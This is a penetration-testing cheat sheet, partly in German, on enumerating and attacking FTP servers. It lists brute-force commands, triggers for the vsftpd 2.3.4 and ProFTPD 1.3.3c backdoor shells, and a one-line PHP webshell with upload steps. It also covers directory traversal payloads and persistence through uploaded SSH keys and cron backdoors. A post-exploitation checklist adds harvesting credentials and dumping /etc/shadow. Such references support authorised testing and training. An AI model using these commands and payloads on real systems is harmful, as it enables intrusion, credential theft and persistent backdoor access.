cpanel,m# FTP ENUMERATION (Port 21/990)

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p21 <IP>                              # Service/Version detection
nc -nv <IP> 21                                  # Manual banner grab
telnet <IP> 21                                  # Alternative banner grab
openssl s_client -connect <IP>:990              # FTPS banner (implicit TLS)
openssl s_client -connect <IP>:21 -starttls ftp # FTPS banner (explicit TLS)
```

## ANONYMOUS ACCESS TESTING
```bash
ftp <IP>                                        # Login (user: anonymous, pass: anonymous)
nmap --script=ftp-anon -p21 <IP>                # Check anonymous login
hydra -l anonymous -p anonymous <IP> ftp        # Verify anon access
echo "USER anonymous" | nc -nv <IP> 21          # Manual anon check
```

## AUTHENTICATION & BRUTE FORCE
```bash
# Brute Force
hydra -L users.txt -P passwords.txt <IP> ftp    # User/pass wordlist
hydra -l admin -P rockyou.txt <IP> ftp          # Single user brute
nmap --script=ftp-brute -p21 <IP>               # Nmap brute force
medusa -h <IP> -u admin -P passwords.txt -M ftp # Alternative brute
patator ftp_login host=<IP> user=FILE0 password=FILE1 0=users.txt 1=pass.txt

# Common credentials
ftp/ftp, admin/admin, root/root, user/user, test/test, guest/guest
```

## NMAP ENUMERATION SCRIPTS (ALL-IN-ONE)
```bash
nmap --script "ftp-*" -p21 <IP>                 # Run ALL FTP scripts
nmap --script=ftp-syst -p21 <IP>                # Server system info (SYST)
nmap --script=ftp-anon -p21 <IP>                # Anonymous login check
nmap --script=ftp-bounce -p21 <IP>              # FTP bounce attack test
nmap --script=ftp-brute -p21 <IP>               # Brute force attack
nmap --script=ftp-libopie -p21 <IP>             # OPIE authentication test
nmap --script=ftp-proftpd-backdoor -p21 <IP>    # ProFTPD 1.3.3c backdoor
nmap --script=ftp-vsftpd-backdoor -p21 <IP>     # vsftpd 2.3.4 backdoor
nmap --script=ftp-vuln* -p21 <IP>               # Known vulnerabilities
```

## DIRECTORY & FILE ENUMERATION
```bash
# Nach Login (ftp <IP>)
ls -la                                          # List all files/dirs
dir -C                                          # Alternative listing
ls -R                                           # Recursive listing
cd /                                            # Root directory
pwd                                             # Current directory
stat <file>                                     # File details
```

## AUTOMATED FILE DISCOVERY
```bash
# lftp für automatisierte Enumeration
lftp -u username,password <IP>                  # Connect with credentials
lftp -u anonymous,anonymous <IP>                # Anonymous connect
> find                                          # Find all files
> du -a                                         # Disk usage (shows all files)
> mirror /                                      # Mirror entire FTP structure

# wget recursive download
wget -r ftp://anonymous:anonymous@<IP>          # Recursive download
wget -m ftp://<IP> --user=admin --password=pass # Mirror FTP site
wget -r --no-parent ftp://<IP>/dir/             # Download specific dir
```

## FTP COMMANDS & TESTING
```bash
# Wichtige FTP-Befehle (nach Login)
USER <username>                                 # Username
PASS <password>                                 # Password
SYST                                            # System information
STAT                                            # Server status
HELP                                            # Available commands
FEAT                                            # Feature list (extensions)
PWD                                             # Print working directory
CWD <dir>                                       # Change directory
CDUP                                            # Change to parent dir
LIST                                            # List files (detailed)
NLST                                            # Name list (simple)
RETR <file>                                     # Download file
STOR <file>                                     # Upload file
DELE <file>                                     # Delete file
RMD <dir>                                       # Remove directory
MKD <dir>                                       # Make directory
RENAME <from> <to>                              # Rename file
SITE <cmd>                                      # Server-specific commands
SITE CHMOD <perms> <file>                       # Change permissions
NOOP                                            # Keep-alive
QUIT                                            # Disconnect
```

## MANUAL FTP TESTING (NETCAT)
```bash
nc -nv <IP> 21                                  # Connect
> USER anonymous                                # Send username
> PASS anonymous                                # Send password
> SYST                                          # Get system info
> FEAT                                          # Get features
> LIST                                          # List files
> PASV                                          # Enter passive mode
> RETR <file>                                   # Download file (need data connection)
```

## PASSIVE VS ACTIVE MODE
```bash
# Passive Mode (empfohlen für Firewalls)
ftp> passive                                    # Toggle passive mode
ftp> pass                                       # Show passive status
quote PASV                                      # Manually enter passive mode

# Active Mode (default, oft geblockt)
ftp> active                                     # Toggle active mode
quote PORT <ip>,<port_high>,<port_low>          # Manually set active mode
```

## BINARY VS ASCII MODE
```bash
ftp> binary                                     # Binary mode (für executables)
ftp> ascii                                      # ASCII mode (für text files)
ftp> status                                     # Check current mode
```

## FILE UPLOAD/DOWNLOAD TESTING
```bash
# Download
get <filename>                                  # Download single file
mget *.txt                                      # Download multiple files
recv <filename>                                 # Alternative download

# Upload (test write permissions)
put <local_file> <remote_file>                  # Upload single file
mput *.php                                      # Upload multiple files
send <filename>                                 # Alternative upload

# Test shell upload
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
put shell.php                                   # Upload webshell
```

## RECURSIVE DOWNLOAD
```bash
# lftp method (best)
lftp -u user,pass <IP>
> mirror -R /                                   # Download everything
> mirror -c /dir                                # Continue interrupted download
> exit

# wget method
wget -r -np -nH --cut-dirs=1 ftp://user:pass@<IP>/dir/

# ncftp method
ncftp -u user -p pass <IP>
ncftp> mget -R *                                # Recursive download
```

## FTP CLIENT ALTERNATIVEN
```bash
ftp <IP>                                        # Standard FTP client
lftp <IP>                                       # Enhanced FTP client
ncftp <IP>                                      # Alternative client
filezilla                                       # GUI client
curl ftp://<IP> --user user:pass                # Download with curl
curl -T file.txt ftp://<IP>/ --user user:pass   # Upload with curl
```

## FTPS/TLS ENUMERATION (Port 990)
```bash
nmap -p21,990 --script=ssl-enum-ciphers <IP>    # Check FTPS ciphers
nmap -p990 -sV <IP>                             # FTPS version detection
openssl s_client -connect <IP>:990              # Connect to implicit FTPS
openssl s_client -connect <IP>:21 -starttls ftp # Connect to explicit FTPS
sslscan <IP>:990                                # SSL/TLS vulnerability scan
testssl.sh <IP>:990                             # Comprehensive TLS testing
```

## FTP BOUNCE ATTACK
```bash
nmap --script=ftp-bounce -p21 <IP>              # Test bounce attack
nmap -b anonymous:anonymous@<IP> <target>       # Use FTP as proxy to scan target
nmap -Pn -v -n -p22 -b anonymous:pass@<IP> <target>  # Scan specific port via bounce
```

## BACKDOOR DETECTION
```bash
# vsftpd 2.3.4 Backdoor (smiley face trigger)
nmap --script=ftp-vsftpd-backdoor -p21 <IP>     # Automated check
nc <IP> 21                                      # Manual check
> USER backdoor:)                               # Trigger backdoor
> PASS any
nc <IP> 6200                                    # Connect to backdoor shell

# ProFTPD 1.3.3c Backdoor
nmap --script=ftp-proftpd-backdoor -p21 <IP>    # Automated check
telnet <IP> 21
> HELP ACIDBITCHEZ                              # Trigger backdoor
nc <IP> <backdoor_port>                         # Connect to shell
```

## VULNERABILITY SCANNING
```bash
searchsploit ftp                                # Search all FTP exploits
searchsploit vsftpd                             # Search specific FTP server
searchsploit proftpd                            # ProFTPD exploits
nmap --script=ftp-vuln* -p21 <IP>               # All vuln scripts
msfconsole -q -x "search type:exploit ftp"      # Metasploit FTP exploits
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/ftp/ftp_version           # Version detection
use auxiliary/scanner/ftp/anonymous             # Anonymous login scanner
use auxiliary/scanner/ftp/ftp_login             # FTP login scanner
use exploit/unix/ftp/vsftpd_234_backdoor        # vsftpd 2.3.4 exploit
use exploit/unix/ftp/proftpd_133c_backdoor      # ProFTPD 1.3.3c exploit
use exploit/freebsd/ftp/proftp_telnet_iac       # ProFTPD IAC exploit
```

## INTERESSANTE DATEIEN & PFADE
```bash
# Nach Login suchen nach:
/.bash_history                                  # Bash history
/.ssh/id_rsa                                    # SSH private keys
/.ssh/authorized_keys                           # SSH authorized keys
/etc/passwd                                     # User accounts (wenn accessible)
/etc/shadow                                     # Password hashes
/var/www/html/                                  # Web root
/home/*/.ssh/                                   # User SSH keys
/root/.ssh/                                     # Root SSH keys
*.conf                                          # Configuration files
*.bak, *.backup                                 # Backup files
*.log                                           # Log files
web.config, .htaccess                           # Web server configs
id_rsa*, id_dsa*                                # SSH keys
*.kdbx, *.key                                   # Password databases
```

## LOG FILE ANALYSIS
```bash
# Typische FTP Log-Locations (wenn accessible)
/var/log/vsftpd.log                             # vsftpd logs
/var/log/proftpd/                               # ProFTPD logs
/var/log/xferlog                                # Transfer log
/var/log/auth.log                               # Authentication log
```

## AUTOMATION TOOLS
```bash
# FTP Fuzzing
ftp-fuzz <IP>                                   # FTP fuzzer
dotdotpwn -m ftp -h <IP> -u user -p pass        # Directory traversal testing

# All-in-one enumeration
enum4linux -a <IP>                              # If FTP shares info with SMB
ftpmap -s <IP>                                  # FTP fingerprinting

# Custom scripts
python3 /usr/share/nmap/scripts/ftp-anon.nse <IP>  # Manual NSE execution
```

## DIRECTORY TRAVERSAL TESTING
```bash
# Nach Login versuchen:
cd ../../../etc                                 # Path traversal
get ../../../etc/passwd                         # Download via traversal
ls ../../../../                                 # List parent directories

# Encoded traversal
cd %2e%2e%2f%2e%2e%2f%2e%2e%2f                 # URL encoded
cd ..%5c..%5c..%5c                             # Windows style
```

## COMMANDS FOR WRITABLE FTP
```bash
# Wenn Upload möglich ist:
put shell.php                                   # Upload webshell
put reverse.elf                                 # Upload binary
put authorized_keys .ssh/authorized_keys        # Add SSH key
put cron_job /etc/cron.d/backdoor              # Cronjob backdoor (wenn möglich)

# Test directory creation
mkdir test_dir                                  # Create directory
rmdir test_dir                                  # Remove directory
```

## CREDENTIAL HARVESTING
```bash
# FTP-Credentials oft gefunden in:
grep -r "ftp://" /var/www/                      # Web files with FTP URLs
grep -r "password" *.conf                       # Config files
cat .netrc                                      # FTP credentials file
cat .ftpconfig                                  # FTP config
env | grep -i ftp                               # Environment variables
history | grep ftp                              # Command history
```

## POST-EXPLOITATION
```bash
# Nach Zugriff:
1. Download all files: lftp -e "mirror ; quit" -u user,pass <IP>
2. Search for credentials in configs
3. Check for SSH keys
4. Upload webshell wenn Web-Root accessible
5. Check cron jobs und startup scripts
6. Dump /etc/passwd und /etc/shadow (falls möglich)
```

## COMMON FTP SERVERS & VERSIONS
```
vsftpd 2.3.4         # Bekannte Backdoor (smiley exploit)
vsftpd 3.0.3         # Neuere Version, meistens secure
ProFTPD 1.3.3c       # Bekannte Backdoor (ACIDBITCHEZ)
ProFTPD 1.3.5        # Neuere Version
Pure-FTPd            # Meist secure
FileZilla Server     # Windows, oft misconfigured
Microsoft FTP        # Windows IIS FTP
```

## QUICK WIN CHECKLIST
```
☐ Anonymous login testen
☐ Default credentials testen (ftp/ftp, admin/admin)
☐ Banner für Version grabben
☐ searchsploit für Version prüfen
☐ Writable directories finden
☐ Sensitive files suchen (.ssh, .bash_history, passwords)
☐ Alles downloaden für offline analysis
☐ FTPS/TLS Konfiguration prüfen
☐ Backdoor checks (vsftpd 2.3.4, ProFTPD 1.3.3c)
☐ FTP bounce attack testen
☐ Directory traversal versuchen
☐ Upload webshell wenn Web-Root accessible
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive scan
nmap -sV -p21,990 --script="ftp-* and ssl-enum-ciphers" -oA ftp_enum <IP>

# Quick anonymous check & download
lftp -e "find; exit" -u anonymous,anonymous <IP>

# Fast brute force
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <IP> ftp
```
